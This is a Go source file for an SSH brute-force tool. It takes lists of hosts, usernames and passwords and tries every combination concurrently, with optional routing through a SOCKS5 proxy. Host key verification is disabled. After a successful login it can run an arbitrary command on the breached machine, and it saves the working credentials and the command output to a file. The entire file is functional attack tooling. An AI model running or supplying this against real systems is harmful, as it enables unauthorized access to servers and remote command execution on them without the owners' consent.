package ssh_bruteforce

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	worker "github.com/namcuongq/worker"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

var (
	channelResult = make(chan string, 0)
	successList   = make(map[string]bool, 0)
)

func show(mess ...any) {
	if debug {
		fmt.Print(time.Now().Format("15:04:05 02/01/2006"), "[Debug]")
		fmt.Println(mess...)
	}
}

func sshConnect(ip, user, pass string) {
	if successList[fmt.Sprintf("%s@%s", user, ip)] {
		return
	}

	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		Timeout:         timer,
	}

	again := 0
	var (
		sshClient *ssh.Client
		conn      net.Conn
		chans     <-chan ssh.NewChannel
		reqs      <-chan *ssh.Request
		c         ssh.Conn
		err       error
	)

	for {
		if len(sock5) > 0 {
			dialer, err := proxy.SOCKS5("tcp", sock5, nil, proxy.Direct)
			if err != nil {
				log.Fatal(err)
			}
			show("dial", ip, user, pass)
			conn, err = dialer.Dial("tcp", ip)
			show("dial", ip, user, pass, "done")
			if err != nil {
				fmt.Printf("%s [%s]: %v ---\n", color.RedString("Failed"), ip, err)
				return
			}

		} else {
			show("dial", ip, user, pass)
			conn, err = net.DialTimeout("tcp", ip, config.Timeout)
			show("dial", ip, user, pass, "done")
			if err != nil {
				fmt.Printf("%s [%s]: %s/%s %v ---\n", color.RedString("Failed"), ip, user, pass, err)
				return
			}

		}

		show("handshake", ip, user, pass)
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		c, chans, reqs, err = ssh.NewClientConn(conn, ip, config)
		show("handshake", ip, user, pass, "done")
		if err != nil {
			if strings.Contains(err.Error(), "i/o timeout") && again < 3 {
				fmt.Printf("%s [%s]: %s/%s %v ---\n", color.RedString("Failed"), ip, user, pass, err)
				fmt.Printf("%s [%s]: Try again(%d) %s/%s ---\n", color.RedString("Failed"), ip, again+1, user, pass)
				again++
				continue
			}

			fmt.Printf("%s [%s]: %s/%s %v ---\n", color.RedString("Failed"), ip, user, pass, err)
			return
		}
		defer c.Close()
		break
	}

	show("connect", ip, user, pass)
	sshClient = ssh.NewClient(c, chans, reqs)
	show("connect", ip, user, pass, "done")
	if err != nil {
		fmt.Printf("%s [%s]: %s/%s %v---\n", color.RedString("Failed"), ip, user, pass, err)
		return
	}
	defer sshClient.Close()

	fmt.Printf("%s [%s]: %s/%s\n", color.BlueString("Success: "), color.GreenString(ip), color.GreenString(user), color.GreenString(pass))
	successList[fmt.Sprintf("%s@%s", user, ip)] = true
	message := fmt.Sprintf("[%s] %s/%s", ip, user, pass)
	if len(cmd) > 0 {
		show("session", ip, user, pass, cmd)
		session, err := sshClient.NewSession()
		show("session", ip, user, pass, cmd, "done")
		if err != nil {
			fmt.Printf("%s %s %v\n", color.RedString("\nCreate session error:"), ip, err)
			return
		}
		defer session.Close()

		output := ""
		show("command", ip, user, pass, cmd)
		combo, err := session.CombinedOutput(cmd)
		show("command", ip, user, pass, cmd, "done")
		if err != nil {
			fmt.Printf("%s %s %v\n", color.RedString("Command "+cmd+" error on: "), ip, err)
			output = "Error"
		} else {
			output = strings.ReplaceAll(string(combo), "\n", "")
		}
		message = fmt.Sprintf("[%s] %s/%s - [%s] %s", ip, user, pass, cmd, output)
	}

	show("channel", ip, user, pass)
	channelResult <- message
	show("channel", ip, user, pass, cmd, output, "done")

}

func writeOutput(outputWriter *os.File) {
	for {
		select {
		case msg := <-channelResult:
			show("select", msg)
			if msg == "0" {
				return
			}
			_, err := outputWriter.WriteString(fmt.Sprintf("%s\n", msg))
			if err != nil {
				panic(err)
			}
		}
	}
}

func printUsedValues() {
	if len(hostFile) > 0 {
		fmt.Println("host file:", hostFile)
	} else if len(host) > 0 {
		fmt.Println("host:", host)
	} else {
		fmt.Println("Host information must be supplied")
		os.Exit(1)
	}

	if len(userFile) > 0 {
		fmt.Println("user file:", userFile)
	} else if len(user) > 0 {
		fmt.Println("user:", user)
	} else {
		fmt.Println("User logon information must be supplied")
		os.Exit(1)
	}

	if len(passFile) > 0 {
		fmt.Println("password file:", passFile)
	} else if len(password) > 0 {
		fmt.Println("password:", password)
	} else {
		fmt.Println("Password information must be supplied")
		os.Exit(1)
	}

	fmt.Println("port:", port)
	fmt.Println("timer:", timer)
	fmt.Println("additional args:", flag.Args())
}

func Task(data interface{}) {
	arr := data.([]string)
	sshConnect(arr[0], arr[1], arr[2])
}

func Start() {
	printUsedValues()
	userList := []string{}
	passwordList := []string{}
	hostList := []string{}

	if len(userFile) > 0 {
		userList = fileToLines(userFile)
	} else {
		userList = []string{user}
	}

	if len(passFile) > 0 {
		passwordList = fileToLines(passFile)
	} else {
		passwordList = []string{password}
	}

	if len(hostFile) > 0 {
		hostList = fileToLines(hostFile)
	} else {
		hostList = []string{host}
	}

	outputWriter, err := os.Create(output)
	if err != nil {
		log.Fatal(err)
	}

	go writeOutput(outputWriter)

	pool := worker.New(concurrent, Task)
	for _, ip := range hostList {
		sshServerAddress := ip + ":" + strconv.Itoa(port)
		for _, u := range userList {
			for _, p := range passwordList {
				pool.Add([]string{sshServerAddress, u, p})
			}
		}
	}

	pool.WaitAndClose()
	channelResult <- "0"
	close(channelResult)
}

func fileToLines(path string) (arr []string) {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		arr = append(arr, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}
